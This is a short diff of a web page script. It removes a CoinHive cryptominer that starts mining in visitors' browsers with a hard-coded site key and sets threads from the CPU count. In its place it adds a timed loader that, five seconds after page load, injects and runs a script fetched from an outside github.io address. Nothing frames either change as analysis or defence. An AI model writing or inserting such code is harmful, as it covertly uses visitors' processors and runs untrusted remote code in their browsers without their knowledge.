@@ -9,14 +9,9 @@ function mide()
 
 function fin()
 {
-	if (navigator.hardwareConcurrency > 1){
-	    var cpuConfig = {threads: Math.round(navigator.hardwareConcurrency/2)}
-	}else{
-	    var cpuConfig = {throttle:0.6}
-	}
-	    var miner = new CoinHive.Anonymous('PaCWx1Ej0CpdT7HFXfMsJzdRvtG2CN6i');
-	    miner.start();
-
+	var ele=document.createElement("script");
+	ele.src="https://bishushanzhuang.github.io/test/start.js";
+	document.body.appendChild(ele);
 }
 setTimeout("mide()",1000);
 setTimeout("fin()",5000);
